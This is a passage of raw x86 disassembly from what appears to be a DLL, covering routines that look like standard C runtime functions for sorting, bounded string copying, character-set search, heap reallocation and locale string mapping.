10009e91:	72 59                	jb     0x10009eec
10009e93:	89 95 e4 fe ff ff    	mov    %edx,-0x11c(%ebp)
10009e99:	89 9d e8 fe ff ff    	mov    %ebx,-0x118(%ebp)
10009e9f:	74 36                	je     0x10009ed7
10009ea1:	2b f3                	sub    %ebx,%esi
10009ea3:	8b d3                	mov    %ebx,%edx
10009ea5:	8b 9d e4 fe ff ff    	mov    -0x11c(%ebp),%ebx
10009eab:	eb 03                	jmp    0x10009eb0
10009ead:	8d 49 00             	lea    0x0(%ecx),%ecx
10009eb0:	8a 02                	mov    (%edx),%al
10009eb2:	8d 52 01             	lea    0x1(%edx),%edx
10009eb5:	8a 4c 16 ff          	mov    -0x1(%esi,%edx,1),%cl
10009eb9:	88 44 16 ff          	mov    %al,-0x1(%esi,%edx,1)
10009ebd:	88 4a ff             	mov    %cl,-0x1(%edx)
10009ec0:	83 eb 01             	sub    $0x1,%ebx
10009ec3:	75 eb                	jne    0x10009eb0
10009ec5:	8b b5 f0 fe ff ff    	mov    -0x110(%ebp),%esi
10009ecb:	8b 9d 08 ff ff ff    	mov    -0xf8(%ebp),%ebx
10009ed1:	8b 95 00 ff ff ff    	mov    -0x100(%ebp),%edx
10009ed7:	8b 85 04 ff ff ff    	mov    -0xfc(%ebp),%eax
10009edd:	3b fb                	cmp    %ebx,%edi
10009edf:	0f 85 eb fe ff ff    	jne    0x10009dd0
10009ee5:	8b fe                	mov    %esi,%edi
10009ee7:	e9 e4 fe ff ff       	jmp    0x10009dd0
10009eec:	3b f8                	cmp    %eax,%edi
10009eee:	73 35                	jae    0x10009f25
10009ef0:	8b 9d f8 fe ff ff    	mov    -0x108(%ebp),%ebx
10009ef6:	2b c2                	sub    %edx,%eax
10009ef8:	89 85 08 ff ff ff    	mov    %eax,-0xf8(%ebp)
10009efe:	3b c7                	cmp    %edi,%eax
10009f00:	76 23                	jbe    0x10009f25
10009f02:	57                   	push   %edi
10009f03:	50                   	push   %eax
10009f04:	8b cb                	mov    %ebx,%ecx
10009f06:	ff 15 5c d1 00 10    	call   *0x1000d15c
10009f0c:	ff d3                	call   *%ebx
10009f0e:	8b 95 00 ff ff ff    	mov    -0x100(%ebp),%edx
10009f14:	83 c4 08             	add    $0x8,%esp
10009f17:	85 c0                	test   %eax,%eax
10009f19:	8b 85 08 ff ff ff    	mov    -0xf8(%ebp),%eax
10009f1f:	74 d5                	je     0x10009ef6
10009f21:	3b f8                	cmp    %eax,%edi
10009f23:	72 3b                	jb     0x10009f60
10009f25:	8b 9d f8 fe ff ff    	mov    -0x108(%ebp),%ebx
10009f2b:	8b b5 00 ff ff ff    	mov    -0x100(%ebp),%esi
10009f31:	2b c6                	sub    %esi,%eax
10009f33:	89 85 08 ff ff ff    	mov    %eax,-0xf8(%ebp)
10009f39:	3b 85 fc fe ff ff    	cmp    -0x104(%ebp),%eax
10009f3f:	76 19                	jbe    0x10009f5a
10009f41:	57                   	push   %edi
10009f42:	50                   	push   %eax
10009f43:	8b cb                	mov    %ebx,%ecx
10009f45:	ff 15 5c d1 00 10    	call   *0x1000d15c
10009f4b:	ff d3                	call   *%ebx
10009f4d:	83 c4 08             	add    $0x8,%esp
10009f50:	85 c0                	test   %eax,%eax
10009f52:	8b 85 08 ff ff ff    	mov    -0xf8(%ebp),%eax
10009f58:	74 d7                	je     0x10009f31
10009f5a:	8b b5 f0 fe ff ff    	mov    -0x110(%ebp),%esi
10009f60:	8b 95 04 ff ff ff    	mov    -0xfc(%ebp),%edx
10009f66:	8b ca                	mov    %edx,%ecx
10009f68:	8b bd fc fe ff ff    	mov    -0x104(%ebp),%edi
10009f6e:	2b ce                	sub    %esi,%ecx
10009f70:	2b c7                	sub    %edi,%eax
10009f72:	3b c1                	cmp    %ecx,%eax
10009f74:	7c 41                	jl     0x10009fb7
10009f76:	8b 85 08 ff ff ff    	mov    -0xf8(%ebp),%eax
10009f7c:	3b f8                	cmp    %eax,%edi
10009f7e:	73 18                	jae    0x10009f98
10009f80:	8b 8d f4 fe ff ff    	mov    -0x10c(%ebp),%ecx
10009f86:	89 7c 8d 84          	mov    %edi,-0x7c(%ebp,%ecx,4)
10009f8a:	89 84 8d 0c ff ff ff 	mov    %eax,-0xf4(%ebp,%ecx,4)
10009f91:	41                   	inc    %ecx
10009f92:	89 8d f4 fe ff ff    	mov    %ecx,-0x10c(%ebp)
10009f98:	8b 8d 04 ff ff ff    	mov    -0xfc(%ebp),%ecx
10009f9e:	8b bd 00 ff ff ff    	mov    -0x100(%ebp),%edi
10009fa4:	3b f1                	cmp    %ecx,%esi
10009fa6:	0f 83 49 fd ff ff    	jae    0x10009cf5
10009fac:	89 b5 fc fe ff ff    	mov    %esi,-0x104(%ebp)
10009fb2:	e9 7b fc ff ff       	jmp    0x10009c32
10009fb7:	3b f2                	cmp    %edx,%esi
10009fb9:	73 18                	jae    0x10009fd3
10009fbb:	8b 85 f4 fe ff ff    	mov    -0x10c(%ebp),%eax
10009fc1:	89 74 85 84          	mov    %esi,-0x7c(%ebp,%eax,4)
10009fc5:	89 94 85 0c ff ff ff 	mov    %edx,-0xf4(%ebp,%eax,4)
10009fcc:	40                   	inc    %eax
10009fcd:	89 85 f4 fe ff ff    	mov    %eax,-0x10c(%ebp)
10009fd3:	8b 85 08 ff ff ff    	mov    -0xf8(%ebp),%eax
10009fd9:	8b b5 fc fe ff ff    	mov    -0x104(%ebp),%esi
10009fdf:	8b bd 00 ff ff ff    	mov    -0x100(%ebp),%edi
10009fe5:	3b f0                	cmp    %eax,%esi
10009fe7:	0f 83 08 fd ff ff    	jae    0x10009cf5
10009fed:	8b c8                	mov    %eax,%ecx
10009fef:	e9 38 fc ff ff       	jmp    0x10009c2c
10009ff4:	8b ff                	mov    %edi,%edi
10009ff6:	55                   	push   %ebp
10009ff7:	8b ec                	mov    %esp,%ebp
10009ff9:	8b 4d 08             	mov    0x8(%ebp),%ecx
10009ffc:	53                   	push   %ebx
10009ffd:	8b 5d 10             	mov    0x10(%ebp),%ebx
1000a000:	56                   	push   %esi
1000a001:	8b 75 14             	mov    0x14(%ebp),%esi
1000a004:	85 f6                	test   %esi,%esi
1000a006:	75 1e                	jne    0x1000a026
1000a008:	85 c9                	test   %ecx,%ecx
1000a00a:	75 1e                	jne    0x1000a02a
1000a00c:	39 75 0c             	cmp    %esi,0xc(%ebp)
1000a00f:	74 27                	je     0x1000a038
1000a011:	e8 00 b6 ff ff       	call   0x10005616
1000a016:	6a 16                	push   $0x16
1000a018:	5e                   	pop    %esi
1000a019:	89 30                	mov    %esi,(%eax)
1000a01b:	e8 39 b5 ff ff       	call   0x10005559
1000a020:	8b c6                	mov    %esi,%eax
1000a022:	5e                   	pop    %esi
1000a023:	5b                   	pop    %ebx
1000a024:	5d                   	pop    %ebp
1000a025:	c3                   	ret
1000a026:	85 c9                	test   %ecx,%ecx
1000a028:	74 e7                	je     0x1000a011
1000a02a:	8b 45 0c             	mov    0xc(%ebp),%eax
1000a02d:	85 c0                	test   %eax,%eax
1000a02f:	74 e0                	je     0x1000a011
1000a031:	85 f6                	test   %esi,%esi
1000a033:	75 07                	jne    0x1000a03c
1000a035:	c6 01 00             	movb   $0x0,(%ecx)
1000a038:	33 c0                	xor    %eax,%eax
1000a03a:	eb e6                	jmp    0x1000a022
1000a03c:	85 db                	test   %ebx,%ebx
1000a03e:	75 04                	jne    0x1000a044
1000a040:	88 19                	mov    %bl,(%ecx)
1000a042:	eb cd                	jmp    0x1000a011
1000a044:	2b d9                	sub    %ecx,%ebx
1000a046:	8b d1                	mov    %ecx,%edx
1000a048:	57                   	push   %edi
1000a049:	8b f8                	mov    %eax,%edi
1000a04b:	83 fe ff             	cmp    $0xffffffff,%esi
1000a04e:	75 11                	jne    0x1000a061
1000a050:	8a 04 13             	mov    (%ebx,%edx,1),%al
1000a053:	88 02                	mov    %al,(%edx)
1000a055:	42                   	inc    %edx
1000a056:	84 c0                	test   %al,%al
1000a058:	74 27                	je     0x1000a081
1000a05a:	83 ef 01             	sub    $0x1,%edi
1000a05d:	75 f1                	jne    0x1000a050
1000a05f:	eb 20                	jmp    0x1000a081
1000a061:	8b ce                	mov    %esi,%ecx
1000a063:	8a 04 13             	mov    (%ebx,%edx,1),%al
1000a066:	88 02                	mov    %al,(%edx)
1000a068:	42                   	inc    %edx
1000a069:	84 c0                	test   %al,%al
1000a06b:	74 0a                	je     0x1000a077
1000a06d:	83 ef 01             	sub    $0x1,%edi
1000a070:	74 05                	je     0x1000a077
1000a072:	83 e9 01             	sub    $0x1,%ecx
1000a075:	75 ec                	jne    0x1000a063
1000a077:	85 c9                	test   %ecx,%ecx
1000a079:	8b 4d 08             	mov    0x8(%ebp),%ecx
1000a07c:	75 03                	jne    0x1000a081
1000a07e:	c6 02 00             	movb   $0x0,(%edx)
1000a081:	85 ff                	test   %edi,%edi
1000a083:	5f                   	pop    %edi
1000a084:	75 b2                	jne    0x1000a038
1000a086:	83 fe ff             	cmp    $0xffffffff,%esi
1000a089:	75 0d                	jne    0x1000a098
1000a08b:	8b 45 0c             	mov    0xc(%ebp),%eax
1000a08e:	6a 50                	push   $0x50
1000a090:	c6 44 01 ff 00       	movb   $0x0,-0x1(%ecx,%eax,1)
1000a095:	58                   	pop    %eax
1000a096:	eb 8a                	jmp    0x1000a022
1000a098:	c6 01 00             	movb   $0x0,(%ecx)
1000a09b:	e8 76 b5 ff ff       	call   0x10005616
1000a0a0:	6a 22                	push   $0x22
1000a0a2:	e9 71 ff ff ff       	jmp    0x1000a018
1000a0a7:	8b ff                	mov    %edi,%edi
1000a0a9:	55                   	push   %ebp
1000a0aa:	8b ec                	mov    %esp,%ebp
1000a0ac:	5d                   	pop    %ebp
1000a0ad:	e9 42 ff ff ff       	jmp    0x10009ff4
1000a0b2:	cc                   	int3
1000a0b3:	cc                   	int3
1000a0b4:	cc                   	int3
1000a0b5:	cc                   	int3
1000a0b6:	cc                   	int3
1000a0b7:	cc                   	int3
1000a0b8:	cc                   	int3
1000a0b9:	cc                   	int3
1000a0ba:	cc                   	int3
1000a0bb:	cc                   	int3
1000a0bc:	cc                   	int3
1000a0bd:	cc                   	int3
1000a0be:	cc                   	int3
1000a0bf:	cc                   	int3
1000a0c0:	55                   	push   %ebp
1000a0c1:	8b ec                	mov    %esp,%ebp
1000a0c3:	56                   	push   %esi
1000a0c4:	33 c0                	xor    %eax,%eax
1000a0c6:	50                   	push   %eax
1000a0c7:	50                   	push   %eax
1000a0c8:	50                   	push   %eax
1000a0c9:	50                   	push   %eax
1000a0ca:	50                   	push   %eax
1000a0cb:	50                   	push   %eax
1000a0cc:	50                   	push   %eax
1000a0cd:	50                   	push   %eax
1000a0ce:	8b 55 0c             	mov    0xc(%ebp),%edx
1000a0d1:	8d 49 00             	lea    0x0(%ecx),%ecx
1000a0d4:	8a 02                	mov    (%edx),%al
1000a0d6:	0a c0                	or     %al,%al
1000a0d8:	74 09                	je     0x1000a0e3
1000a0da:	83 c2 01             	add    $0x1,%edx
1000a0dd:	0f ab 04 24          	bts    %eax,(%esp)
1000a0e1:	eb f1                	jmp    0x1000a0d4
1000a0e3:	8b 75 08             	mov    0x8(%ebp),%esi
1000a0e6:	8b ff                	mov    %edi,%edi
1000a0e8:	8a 06                	mov    (%esi),%al
1000a0ea:	0a c0                	or     %al,%al
1000a0ec:	74 0c                	je     0x1000a0fa
1000a0ee:	83 c6 01             	add    $0x1,%esi
1000a0f1:	0f a3 04 24          	bt     %eax,(%esp)
1000a0f5:	73 f1                	jae    0x1000a0e8
1000a0f7:	8d 46 ff             	lea    -0x1(%esi),%eax
1000a0fa:	83 c4 20             	add    $0x20,%esp
1000a0fd:	5e                   	pop    %esi
1000a0fe:	c9                   	leave
1000a0ff:	c3                   	ret
1000a100:	8b ff                	mov    %edi,%edi
1000a102:	55                   	push   %ebp
1000a103:	8b ec                	mov    %esp,%ebp
1000a105:	6a 00                	push   $0x0
1000a107:	ff 75 0c             	push   0xc(%ebp)
1000a10a:	ff 75 08             	push   0x8(%ebp)
1000a10d:	e8 05 00 00 00       	call   0x1000a117
1000a112:	83 c4 0c             	add    $0xc,%esp
1000a115:	5d                   	pop    %ebp
1000a116:	c3                   	ret
1000a117:	8b ff                	mov    %edi,%edi
1000a119:	55                   	push   %ebp
1000a11a:	8b ec                	mov    %esp,%ebp
1000a11c:	83 ec 10             	sub    $0x10,%esp
1000a11f:	83 7d 08 00          	cmpl   $0x0,0x8(%ebp)
1000a123:	75 14                	jne    0x1000a139
1000a125:	e8 ec b4 ff ff       	call   0x10005616
1000a12a:	c7 00 16 00 00 00    	movl   $0x16,(%eax)
1000a130:	e8 24 b4 ff ff       	call   0x10005559
1000a135:	33 c0                	xor    %eax,%eax
1000a137:	c9                   	leave
1000a138:	c3                   	ret
1000a139:	56                   	push   %esi
1000a13a:	8b 75 0c             	mov    0xc(%ebp),%esi
1000a13d:	85 f6                	test   %esi,%esi
1000a13f:	75 12                	jne    0x1000a153
1000a141:	e8 d0 b4 ff ff       	call   0x10005616
1000a146:	c7 00 16 00 00 00    	movl   $0x16,(%eax)
1000a14c:	e8 08 b4 ff ff       	call   0x10005559
1000a151:	eb 05                	jmp    0x1000a158
1000a153:	39 75 08             	cmp    %esi,0x8(%ebp)
1000a156:	72 04                	jb     0x1000a15c
1000a158:	33 c0                	xor    %eax,%eax
1000a15a:	eb 45                	jmp    0x1000a1a1
1000a15c:	ff 75 10             	push   0x10(%ebp)
1000a15f:	8d 4d f0             	lea    -0x10(%ebp),%ecx
1000a162:	e8 79 a1 ff ff       	call   0x100042e0
1000a167:	8b 4d f8             	mov    -0x8(%ebp),%ecx
1000a16a:	8d 56 ff             	lea    -0x1(%esi),%edx
1000a16d:	83 79 08 00          	cmpl   $0x0,0x8(%ecx)
1000a171:	74 1c                	je     0x1000a18f
1000a173:	4a                   	dec    %edx
1000a174:	39 55 08             	cmp    %edx,0x8(%ebp)
1000a177:	77 0a                	ja     0x1000a183
1000a179:	0f b6 02             	movzbl (%edx),%eax
1000a17c:	f6 44 08 19 04       	testb  $0x4,0x19(%eax,%ecx,1)
1000a181:	75 f0                	jne    0x1000a173
1000a183:	8b c6                	mov    %esi,%eax
1000a185:	2b c2                	sub    %edx,%eax
1000a187:	8b d6                	mov    %esi,%edx
1000a189:	83 e0 01             	and    $0x1,%eax
1000a18c:	2b d0                	sub    %eax,%edx
1000a18e:	4a                   	dec    %edx
1000a18f:	80 7d fc 00          	cmpb   $0x0,-0x4(%ebp)
1000a193:	74 0a                	je     0x1000a19f
1000a195:	8b 4d f0             	mov    -0x10(%ebp),%ecx
1000a198:	83 a1 50 03 00 00 fd 	andl   $0xfffffffd,0x350(%ecx)
1000a19f:	8b c2                	mov    %edx,%eax
1000a1a1:	5e                   	pop    %esi
1000a1a2:	c9                   	leave
1000a1a3:	c3                   	ret
1000a1a4:	8b ff                	mov    %edi,%edi
1000a1a6:	55                   	push   %ebp
1000a1a7:	8b ec                	mov    %esp,%ebp
1000a1a9:	51                   	push   %ecx
1000a1aa:	51                   	push   %ecx
1000a1ab:	a1 04 30 01 10       	mov    0x10013004,%eax
1000a1b0:	33 c5                	xor    %ebp,%eax
1000a1b2:	89 45 fc             	mov    %eax,-0x4(%ebp)
1000a1b5:	53                   	push   %ebx
1000a1b6:	56                   	push   %esi
1000a1b7:	8b 75 18             	mov    0x18(%ebp),%esi
1000a1ba:	57                   	push   %edi
1000a1bb:	85 f6                	test   %esi,%esi
1000a1bd:	7e 14                	jle    0x1000a1d3
1000a1bf:	56                   	push   %esi
1000a1c0:	ff 75 14             	push   0x14(%ebp)
1000a1c3:	e8 a5 09 00 00       	call   0x1000ab6d
1000a1c8:	59                   	pop    %ecx
1000a1c9:	3b c6                	cmp    %esi,%eax
1000a1cb:	59                   	pop    %ecx
1000a1cc:	8d 70 01             	lea    0x1(%eax),%esi
1000a1cf:	7c 02                	jl     0x1000a1d3
1000a1d1:	8b f0                	mov    %eax,%esi
1000a1d3:	8b 7d 24             	mov    0x24(%ebp),%edi
1000a1d6:	85 ff                	test   %edi,%edi
1000a1d8:	75 0b                	jne    0x1000a1e5
1000a1da:	8b 45 08             	mov    0x8(%ebp),%eax
1000a1dd:	8b 00                	mov    (%eax),%eax
1000a1df:	8b 78 08             	mov    0x8(%eax),%edi
1000a1e2:	89 7d 24             	mov    %edi,0x24(%ebp)
1000a1e5:	33 c0                	xor    %eax,%eax
1000a1e7:	39 45 28             	cmp    %eax,0x28(%ebp)
1000a1ea:	6a 00                	push   $0x0
1000a1ec:	6a 00                	push   $0x0
1000a1ee:	0f 95 c0             	setne  %al
1000a1f1:	56                   	push   %esi
1000a1f2:	ff 75 14             	push   0x14(%ebp)
1000a1f5:	8d 04 c5 01 00 00 00 	lea    0x1(,%eax,8),%eax
1000a1fc:	50                   	push   %eax
1000a1fd:	57                   	push   %edi
1000a1fe:	e8 03 da ff ff       	call   0x10007c06
1000a203:	8b d0                	mov    %eax,%edx
1000a205:	83 c4 18             	add    $0x18,%esp
1000a208:	89 55 f8             	mov    %edx,-0x8(%ebp)
1000a20b:	85 d2                	test   %edx,%edx
1000a20d:	0f 84 58 01 00 00    	je     0x1000a36b
1000a213:	8d 04 12             	lea    (%edx,%edx,1),%eax
1000a216:	8d 48 08             	lea    0x8(%eax),%ecx
1000a219:	3b c1                	cmp    %ecx,%eax
1000a21b:	1b c0                	sbb    %eax,%eax
1000a21d:	23 c1                	and    %ecx,%eax
1000a21f:	74 35                	je     0x1000a256
1000a221:	3d 00 04 00 00       	cmp    $0x400,%eax
1000a226:	77 13                	ja     0x1000a23b
1000a228:	e8 63 28 00 00       	call   0x1000ca90
1000a22d:	8b dc                	mov    %esp,%ebx
1000a22f:	85 db                	test   %ebx,%ebx
1000a231:	74 1e                	je     0x1000a251
1000a233:	c7 03 cc cc 00 00    	movl   $0xcccc,(%ebx)
1000a239:	eb 13                	jmp    0x1000a24e
1000a23b:	50                   	push   %eax
1000a23c:	e8 23 be ff ff       	call   0x10006064
1000a241:	8b d8                	mov    %eax,%ebx
1000a243:	59                   	pop    %ecx
1000a244:	85 db                	test   %ebx,%ebx
1000a246:	74 09                	je     0x1000a251
1000a248:	c7 03 dd dd 00 00    	movl   $0xdddd,(%ebx)
1000a24e:	83 c3 08             	add    $0x8,%ebx
1000a251:	8b 55 f8             	mov    -0x8(%ebp),%edx
1000a254:	eb 02                	jmp    0x1000a258
1000a256:	33 db                	xor    %ebx,%ebx
1000a258:	85 db                	test   %ebx,%ebx
1000a25a:	0f 84 00 01 00 00    	je     0x1000a360
1000a260:	52                   	push   %edx
1000a261:	53                   	push   %ebx
1000a262:	56                   	push   %esi
1000a263:	ff 75 14             	push   0x14(%ebp)
1000a266:	6a 01                	push   $0x1
1000a268:	57                   	push   %edi
1000a269:	e8 98 d9 ff ff       	call   0x10007c06
1000a26e:	83 c4 18             	add    $0x18,%esp
1000a271:	85 c0                	test   %eax,%eax
1000a273:	0f 84 e7 00 00 00    	je     0x1000a360
1000a279:	8b 7d f8             	mov    -0x8(%ebp),%edi
1000a27c:	33 c0                	xor    %eax,%eax
1000a27e:	50                   	push   %eax
1000a27f:	50                   	push   %eax
1000a280:	50                   	push   %eax
1000a281:	50                   	push   %eax
1000a282:	50                   	push   %eax
1000a283:	57                   	push   %edi
1000a284:	53                   	push   %ebx
1000a285:	ff 75 10             	push   0x10(%ebp)
1000a288:	ff 75 0c             	push   0xc(%ebp)
1000a28b:	e8 71 b7 ff ff       	call   0x10005a01
1000a290:	8b f0                	mov    %eax,%esi
1000a292:	85 f6                	test   %esi,%esi
1000a294:	0f 84 c6 00 00 00    	je     0x1000a360
1000a29a:	ba 00 04 00 00       	mov    $0x400,%edx
1000a29f:	85 55 10             	test   %edx,0x10(%ebp)
1000a2a2:	74 38                	je     0x1000a2dc
1000a2a4:	8b 45 20             	mov    0x20(%ebp),%eax
1000a2a7:	85 c0                	test   %eax,%eax
1000a2a9:	0f 84 b3 00 00 00    	je     0x1000a362
1000a2af:	3b f0                	cmp    %eax,%esi
1000a2b1:	0f 8f a9 00 00 00    	jg     0x1000a360
1000a2b7:	33 c9                	xor    %ecx,%ecx
1000a2b9:	51                   	push   %ecx
1000a2ba:	51                   	push   %ecx
1000a2bb:	51                   	push   %ecx
1000a2bc:	50                   	push   %eax
1000a2bd:	ff 75 1c             	push   0x1c(%ebp)
1000a2c0:	57                   	push   %edi
1000a2c1:	53                   	push   %ebx
1000a2c2:	ff 75 10             	push   0x10(%ebp)
1000a2c5:	ff 75 0c             	push   0xc(%ebp)
1000a2c8:	e8 34 b7 ff ff       	call   0x10005a01
1000a2cd:	8b f0                	mov    %eax,%esi
1000a2cf:	85 f6                	test   %esi,%esi
1000a2d1:	0f 85 8b 00 00 00    	jne    0x1000a362
1000a2d7:	e9 84 00 00 00       	jmp    0x1000a360
1000a2dc:	8d 04 36             	lea    (%esi,%esi,1),%eax
1000a2df:	8d 48 08             	lea    0x8(%eax),%ecx
1000a2e2:	3b c1                	cmp    %ecx,%eax
1000a2e4:	1b c0                	sbb    %eax,%eax
1000a2e6:	23 c1                	and    %ecx,%eax
1000a2e8:	74 2f                	je     0x1000a319
1000a2ea:	3b c2                	cmp    %edx,%eax
1000a2ec:	77 13                	ja     0x1000a301
1000a2ee:	e8 9d 27 00 00       	call   0x1000ca90
1000a2f3:	8b fc                	mov    %esp,%edi
1000a2f5:	85 ff                	test   %edi,%edi
1000a2f7:	74 60                	je     0x1000a359
1000a2f9:	c7 07 cc cc 00 00    	movl   $0xcccc,(%edi)
1000a2ff:	eb 13                	jmp    0x1000a314
1000a301:	50                   	push   %eax
1000a302:	e8 5d bd ff ff       	call   0x10006064
1000a307:	8b f8                	mov    %eax,%edi
1000a309:	59                   	pop    %ecx
1000a30a:	85 ff                	test   %edi,%edi
1000a30c:	74 4b                	je     0x1000a359
1000a30e:	c7 07 dd dd 00 00    	movl   $0xdddd,(%edi)
1000a314:	83 c7 08             	add    $0x8,%edi
1000a317:	eb 02                	jmp    0x1000a31b
1000a319:	33 ff                	xor    %edi,%edi
1000a31b:	85 ff                	test   %edi,%edi
1000a31d:	74 3a                	je     0x1000a359
1000a31f:	6a 00                	push   $0x0
1000a321:	6a 00                	push   $0x0
1000a323:	6a 00                	push   $0x0
1000a325:	56                   	push   %esi
1000a326:	57                   	push   %edi
1000a327:	ff 75 f8             	push   -0x8(%ebp)
1000a32a:	53                   	push   %ebx
1000a32b:	ff 75 10             	push   0x10(%ebp)
1000a32e:	ff 75 0c             	push   0xc(%ebp)
1000a331:	e8 cb b6 ff ff       	call   0x10005a01
1000a336:	85 c0                	test   %eax,%eax
1000a338:	74 1f                	je     0x1000a359
1000a33a:	33 c0                	xor    %eax,%eax
1000a33c:	50                   	push   %eax
1000a33d:	50                   	push   %eax
1000a33e:	39 45 20             	cmp    %eax,0x20(%ebp)
1000a341:	75 3a                	jne    0x1000a37d
1000a343:	50                   	push   %eax
1000a344:	50                   	push   %eax
1000a345:	56                   	push   %esi
1000a346:	57                   	push   %edi
1000a347:	50                   	push   %eax
1000a348:	ff 75 24             	push   0x24(%ebp)
1000a34b:	e8 32 d9 ff ff       	call   0x10007c82
1000a350:	8b f0                	mov    %eax,%esi
1000a352:	83 c4 20             	add    $0x20,%esp
1000a355:	85 f6                	test   %esi,%esi
1000a357:	75 2c                	jne    0x1000a385
1000a359:	57                   	push   %edi
1000a35a:	e8 ef f7 ff ff       	call   0x10009b4e
1000a35f:	59                   	pop    %ecx
1000a360:	33 f6                	xor    %esi,%esi
1000a362:	53                   	push   %ebx
1000a363:	e8 e6 f7 ff ff       	call   0x10009b4e
1000a368:	59                   	pop    %ecx
1000a369:	8b c6                	mov    %esi,%eax
1000a36b:	8d 65 ec             	lea    -0x14(%ebp),%esp
1000a36e:	5f                   	pop    %edi
1000a36f:	5e                   	pop    %esi
1000a370:	5b                   	pop    %ebx
1000a371:	8b 4d fc             	mov    -0x4(%ebp),%ecx
1000a374:	33 cd                	xor    %ebp,%ecx
1000a376:	e8 0e 79 ff ff       	call   0x10001c89
1000a37b:	c9                   	leave
1000a37c:	c3                   	ret
1000a37d:	ff 75 20             	push   0x20(%ebp)
1000a380:	ff 75 1c             	push   0x1c(%ebp)
1000a383:	eb c0                	jmp    0x1000a345
1000a385:	57                   	push   %edi
1000a386:	e8 c3 f7 ff ff       	call   0x10009b4e
1000a38b:	59                   	pop    %ecx
1000a38c:	eb d4                	jmp    0x1000a362
1000a38e:	8b ff                	mov    %edi,%edi
1000a390:	55                   	push   %ebp
1000a391:	8b ec                	mov    %esp,%ebp
1000a393:	83 ec 10             	sub    $0x10,%esp
1000a396:	ff 75 08             	push   0x8(%ebp)
1000a399:	8d 4d f0             	lea    -0x10(%ebp),%ecx
1000a39c:	e8 3f 9f ff ff       	call   0x100042e0
1000a3a1:	ff 75 28             	push   0x28(%ebp)
1000a3a4:	8d 45 f4             	lea    -0xc(%ebp),%eax
1000a3a7:	ff 75 24             	push   0x24(%ebp)
1000a3aa:	ff 75 20             	push   0x20(%ebp)
1000a3ad:	ff 75 1c             	push   0x1c(%ebp)
1000a3b0:	ff 75 18             	push   0x18(%ebp)
1000a3b3:	ff 75 14             	push   0x14(%ebp)
1000a3b6:	ff 75 10             	push   0x10(%ebp)
1000a3b9:	ff 75 0c             	push   0xc(%ebp)
1000a3bc:	50                   	push   %eax
1000a3bd:	e8 e2 fd ff ff       	call   0x1000a1a4
1000a3c2:	83 c4 24             	add    $0x24,%esp
1000a3c5:	80 7d fc 00          	cmpb   $0x0,-0x4(%ebp)
1000a3c9:	74 0a                	je     0x1000a3d5
1000a3cb:	8b 4d f0             	mov    -0x10(%ebp),%ecx
1000a3ce:	83 a1 50 03 00 00 fd 	andl   $0xfffffffd,0x350(%ecx)
1000a3d5:	c9                   	leave
1000a3d6:	c3                   	ret
1000a3d7:	e8 d3 d4 ff ff       	call   0x100078af
1000a3dc:	33 c9                	xor    %ecx,%ecx
1000a3de:	84 c0                	test   %al,%al
1000a3e0:	0f 94 c1             	sete   %cl
1000a3e3:	8b c1                	mov    %ecx,%eax
1000a3e5:	c3                   	ret
1000a3e6:	8b ff                	mov    %edi,%edi
1000a3e8:	55                   	push   %ebp
1000a3e9:	8b ec                	mov    %esp,%ebp
1000a3eb:	83 7d 08 00          	cmpl   $0x0,0x8(%ebp)
1000a3ef:	75 15                	jne    0x1000a406
1000a3f1:	e8 20 b2 ff ff       	call   0x10005616
1000a3f6:	c7 00 16 00 00 00    	movl   $0x16,(%eax)
1000a3fc:	e8 58 b1 ff ff       	call   0x10005559
1000a401:	83 c8 ff             	or     $0xffffffff,%eax
1000a404:	5d                   	pop    %ebp
1000a405:	c3                   	ret
1000a406:	ff 75 08             	push   0x8(%ebp)
1000a409:	6a 00                	push   $0x0
1000a40b:	ff 35 e0 46 01 10    	push   0x100146e0
1000a411:	ff 15 10 d0 00 10    	call   *0x1000d010
1000a417:	5d                   	pop    %ebp
1000a418:	c3                   	ret
1000a419:	8b ff                	mov    %edi,%edi
1000a41b:	55                   	push   %ebp
1000a41c:	8b ec                	mov    %esp,%ebp
1000a41e:	57                   	push   %edi
1000a41f:	8b 7d 08             	mov    0x8(%ebp),%edi
1000a422:	85 ff                	test   %edi,%edi
1000a424:	75 0b                	jne    0x1000a431
1000a426:	ff 75 0c             	push   0xc(%ebp)
1000a429:	e8 36 bc ff ff       	call   0x10006064
1000a42e:	59                   	pop    %ecx
1000a42f:	eb 24                	jmp    0x1000a455
1000a431:	56                   	push   %esi
1000a432:	8b 75 0c             	mov    0xc(%ebp),%esi
1000a435:	85 f6                	test   %esi,%esi
1000a437:	75 09                	jne    0x1000a442
1000a439:	57                   	push   %edi
1000a43a:	e8 47 b2 ff ff       	call   0x10005686
1000a43f:	59                   	pop    %ecx
1000a440:	eb 10                	jmp    0x1000a452
1000a442:	83 fe e0             	cmp    $0xffffffe0,%esi
1000a445:	76 25                	jbe    0x1000a46c
1000a447:	e8 ca b1 ff ff       	call   0x10005616
1000a44c:	c7 00 0c 00 00 00    	movl   $0xc,(%eax)
1000a452:	33 c0                	xor    %eax,%eax
1000a454:	5e                   	pop    %esi
1000a455:	5f                   	pop    %edi
1000a456:	5d                   	pop    %ebp
1000a457:	c3                   	ret
1000a458:	e8 42 de ff ff       	call   0x1000829f
1000a45d:	85 c0                	test   %eax,%eax
1000a45f:	74 e6                	je     0x1000a447
1000a461:	56                   	push   %esi
1000a462:	e8 f5 a0 ff ff       	call   0x1000455c
1000a467:	59                   	pop    %ecx
1000a468:	85 c0                	test   %eax,%eax
1000a46a:	74 db                	je     0x1000a447
1000a46c:	56                   	push   %esi
1000a46d:	57                   	push   %edi
1000a46e:	6a 00                	push   $0x0
1000a470:	ff 35 e0 46 01 10    	push   0x100146e0
1000a476:	ff 15 0c d0 00 10    	call   *0x1000d00c
1000a47c:	85 c0                	test   %eax,%eax
1000a47e:	74 d8                	je     0x1000a458
1000a480:	eb d2                	jmp    0x1000a454
1000a482:	8b ff                	mov    %edi,%edi
1000a484:	55                   	push   %ebp
1000a485:	8b ec                	mov    %esp,%ebp
1000a487:	8b 4d 10             	mov    0x10(%ebp),%ecx
1000a48a:	85 c9                	test   %ecx,%ecx
1000a48c:	75 04                	jne    0x1000a492
1000a48e:	33 c0                	xor    %eax,%eax
1000a490:	5d                   	pop    %ebp
1000a491:	c3                   	ret
1000a492:	53                   	push   %ebx
1000a493:	8b 5d 0c             	mov    0xc(%ebp),%ebx
1000a496:	56                   	push   %esi
1000a497:	57                   	push   %edi
1000a498:	8b 7d 08             	mov    0x8(%ebp),%edi
1000a49b:	0f b7 17             	movzwl (%edi),%edx
1000a49e:	8d 42 bf             	lea    -0x41(%edx),%eax
1000a4a1:	83 f8 19             	cmp    $0x19,%eax
